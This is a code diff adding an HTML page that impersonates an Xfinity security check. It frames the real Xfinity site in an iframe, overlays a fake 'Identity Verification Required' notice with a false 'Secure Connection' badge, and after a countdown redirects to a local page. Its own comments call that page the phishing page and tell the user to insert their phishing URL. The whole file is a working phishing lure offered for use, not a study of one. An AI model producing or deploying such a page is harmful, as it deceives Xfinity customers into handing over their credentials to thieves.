@@ -1,0 +1,238 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Xfinity Security Verification</title>
+    <link
+      rel="icon"
+      href="https://www.xfinity.com/favicon.ico"
+      type="image/x-icon"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+        overflow: hidden;
+        height: 100vh;
+        background-color: #f5f5f5;
+      }
+
+      #xfinityFrame {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+        z-index: -1;
+      }
+
+      .overlay {
+        position: relative;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        /* background: rgba(0, 0, 0, 0.85); */
+        z-index: 1;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .hidden {
+        display: none !important;
+      }
+
+      .message-box {
+        background: linear-gradient(145deg, #ffffff, #f8f8f8);
+        padding: 40px;
+        border-radius: 12px;
+        text-align: center;
+        max-width: 90%;
+        width: 500px;
+        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(0, 0, 0, 0.1);
+        position: relative;
+        overflow: hidden;
+      }
+
+      .message-box::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 5px;
+        background: linear-gradient(90deg, #0077c8, #66cc66);
+      }
+
+      h2 {
+        color: #333;
+        margin-bottom: 20px;
+        font-weight: 600;
+        font-size: 24px;
+      }
+
+      p {
+        color: #666;
+        margin: 15px 0;
+        line-height: 1.6;
+        font-size: 16px;
+      }
+
+      .loader-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin: 25px 0;
+      }
+
+      .loader {
+        border: 4px solid rgba(0, 119, 200, 0.2);
+        border-top: 4px solid #0077c8;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+        position: relative;
+      }
+
+      .loader::after {
+        content: "";
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 8px;
+        height: 8px;
+        background: #0077c8;
+        border-radius: 50%;
+        transform: translate(-50%, -50%);
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .countdown-container {
+        background: rgba(0, 119, 200, 0.1);
+        padding: 15px;
+        border-radius: 8px;
+        margin-top: 20px;
+      }
+
+      #countdown {
+        font-weight: 700;
+        color: #0077c8;
+        font-size: 22px;
+        display: block;
+      }
+
+      .security-info {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 20px;
+        color: #777;
+        font-size: 14px;
+      }
+
+      /* Responsive design */
+      @media (max-width: 768px) {
+        .message-box {
+          padding: 30px 20px;
+          width: 95%;
+        }
+
+        h2 {
+          font-size: 20px;
+        }
+
+        p {
+          font-size: 14px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .message-box {
+          padding: 25px 15px;
+        }
+
+        h2 {
+          font-size: 18px;
+        }
+
+        p {
+          font-size: 13px;
+        }
+
+        #countdown {
+          font-size: 18px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Real Xfinity page loads in foreground (z-index 1000) -->
+    <iframe id="xfinityFrame" src="https://xfinity.com"></iframe>
+
+    <!-- Overlay appears immediately behind it (z-index 500) -->
+    <div class="overlay hidden" id="overlay">
+      <div class="message-box">
+        <h2>Identity Verification Required</h2>
+
+        <div class="loader-container">
+          <div class="loader"></div>
+        </div>
+
+        <p>
+          As a security measure, please re-authenticate your account to verify
+          your identity.
+        </p>
+
+        <div class="countdown-container">
+          <p>Redirecting to secure login in <span id="countdown">3</span></p>
+        </div>
+
+        <div class="security-info">
+          <span>🔒 Secure Connection</span>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Countdown timer for 3 seconds
+      let count = 7;
+      const iframe = document.getElementById("xfinityFrame");
+      const overlay = document.getElementById("overlay");
+
+      iframe.addEventListener("load", () => {
+        overlay.classList.remove("hidden");
+      });
+      const countdownElement = document.getElementById("countdown");
+
+      // Start countdown immediately
+      const timer = setInterval(function () {
+        count--;
+        countdownElement.textContent = count;
+
+        if (count <= 0) {
+          clearInterval(timer);
+          // Redirect to phishing page
+          window.location.href = "./LINK.html"; // Replace with your phishing page URL
+        }
+      }, 1200);
+    </script>
+  </body>
+</html>
